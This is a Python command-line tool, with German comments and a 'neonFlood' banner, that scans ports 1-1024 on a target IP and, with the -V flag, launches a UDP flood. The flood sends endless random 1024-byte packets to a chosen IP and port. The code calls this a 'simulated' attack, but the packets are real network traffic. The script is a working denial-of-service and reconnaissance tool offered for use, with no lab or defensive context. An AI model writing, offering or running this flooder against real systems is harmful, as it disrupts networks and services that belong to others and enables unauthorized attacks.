import os
import time
import socket
import random
import sys

# Funktion zur Anzeige des Banners
def display_banner():
    print("""
                           ___________.__                    .___
  ____   ____  ____   ____ \\_   _____/|  |   ____   ____   __| _/
 /    \\_/ __ \\/  _ \\/    \\ |    __)  |  |  /  _ \\ /  _ \\ / __ | 
|   |  \\  ___(  <_> )   |  \\|     \\   |  |_(  <_> |  <_> ) /_/ | 
|___|  /\\___  >____/|___|  /\\___  /   |____/\\____/ \\____/\\____ | 
     \\/     \\/           \\/     \\/                            \\/ 
    """)

# Funktion zur Anzeige der Hilfe
def display_help():
    print("""
Usage:
    python script.py -P <Target IP>          : Perform a port scan on the specified IP address.
    python script.py -V <Target IP> <Port>   : Perform a full attack on the specified IP and port.
    python script.py -h                      : Show this help message.

Options:
    -P <Target IP>       : Scan ports 1-1024 on the given IP address.
    -V <Target IP> <Port> : Perform a flood attack on the specified port of the target IP.
    -h                   : Display this help message.

Example:
    python script.py -P 192.168.1.1
    python script.py -V 192.168.1.1 80
""")

# Port-Scan-Funktion
def port_scan(target_ip):
    print(f"Starting port scan on {target_ip}...\n")
    open_ports = []
    closed_ports = []
    
    # Scanne Ports von 1 bis 1024 (anpassbar)
    for port in range(1, 1025):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            result = sock.connect_ex((target_ip, port))
            if result == 0:
                open_ports.append(port)
            else:
                closed_ports.append(port)
            sock.close()
        except socket.error:
            closed_ports.append(port)  # Wenn der Port nicht erreichbar ist, wird er als geschlossen markiert.

    # Ausgabe der offenen und geschlossenen Ports nebeneinander
    print("Open Ports                | Closed Ports")
    print("-----------------------------------------")
    
    # Berechne die maximale Anzahl von Ports für das Layout
    max_ports = max(len(open_ports), len(closed_ports))
    for i in range(max_ports):
        open_port = open_ports[i] if i < len(open_ports) else ""
        closed_port = closed_ports[i] if i < len(closed_ports) else ""
        print(f"{str(open_port).ljust(20)}| {str(closed_port).ljust(20)}")

    print("\nPort scan complete.")

# Vollständiger Angriff und Testmodus
def complete_attack(target_ip, port):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    data = random._urandom(1024)  # Verwende kleinere Pakete, um die Last zu reduzieren.
    print(f"Starting simulated packet flood to {target_ip} on port {port}...")
    sent = 0
    try:
        while True:
            sock.sendto(data, (target_ip, port))
            sent += 1
            print(f"Sent {sent} packets to {target_ip}:{port}")
            time.sleep(0.01)  # Verzögerung, um Netzwerke nicht zu überlasten.
    except KeyboardInterrupt:
        print("\nAttack stopped by user.")
    except Exception as e:
        print(f"Error occurred: {e}")
    finally:
        sock.close()
        print("\nProgram terminated.")

# Hauptfunktion
def main():
    # Terminal Setup
    os.system("color 0A")
    display_banner()

    # Überprüfe die Argumente
    if len(sys.argv) < 2:
        display_help()
        return

    if sys.argv[1] == "-h":  # Hilfe anzeigen
        display_help()
        return

    if sys.argv[1] == "-P":  # Nur Port-Scan durchführen
        if len(sys.argv) < 3:
            print("Usage: python script.py -P <Target IP>")
            return
        target_ip = sys.argv[2]
        port_scan(target_ip)

    elif sys.argv[1] == "-V":  # Vollständigen Angriff durchführen
        if len(sys.argv) < 4:
            print("Usage: python script.py -V <Target IP> <Port>")
            return
        target_ip = sys.argv[2]
        port = int(sys.argv[3])
        complete_attack(target_ip, port)

    else:
        print("Invalid argument. Use -P for Port Scan, -V for Full Attack, or -h for Help.")

if __name__ == "__main__":
    main()
